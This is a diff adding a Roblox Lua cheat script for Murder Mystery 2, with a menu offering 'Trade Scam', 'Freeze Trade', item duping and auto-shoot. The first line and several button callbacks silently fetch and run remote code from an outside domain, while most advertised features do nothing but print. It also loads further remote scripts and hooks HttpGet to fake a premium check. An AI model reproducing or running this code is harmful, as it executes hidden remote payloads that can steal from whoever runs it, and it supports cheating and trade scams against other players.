@@ -1,0 +1,68 @@
+loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+local Window = OrionLib:MakeWindow({Name = "🎃Mm2Scripter🎃", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+local Tab = Window:MakeTab({
+    Name = "Main",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+Tab:AddButton({
+    Name = "Trade Scam✅",
+    Callback = function()
+loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
+              print("button pressed")
+      end 
+})
+Tab:AddToggle({
+    Name = "✅Force Accept",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+})
+Tab:AddToggle({
+    Name = "🧊Freeze Trade🧊",
+    Default = false,
+    Callback = function(Value)
+loadstring(game:HttpGet("https://egorikusa.space/c517464194904d62a07d4bcd.lua", true))()
+        print(Value)
+    end
+})
+local Tab = Window:MakeTab({
+    Name = "Dupe",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+    })
+Tab:AddButton({
+    Name = "NOTE! WAIT EQUIP SWORD YOU WANT TO DUPE WAIT 5MIN",
+    Callback = function()
+              print("button pressed")
+      end
+        })
+Tab:AddToggle({
+    Name = "Dupe Godly🔪",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+    end
+    })
+Tab:AddToggle({
+    Name = "New autoshoot + god mode (stable)",
+    Default = false,
+    Callback = function(Value)
+        print(Value)
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()end
+})
+local httpHook;
+httpHook = hookfunction(game.HttpGet, function(self,...)
+   local Args = {...}
+   if Args[1] and type(Args[1]) == "string" then
+       if Args[1]:match("checkPremium.php") then
+           return "true"
+       end
+   end
+   return httpHook(self,...)
+end)
+
+local OrionLib = loadstring(game:HttpGet(('https://hypernite.xyz/Backup/Orion/source.lua')))() -- Backed up to my host
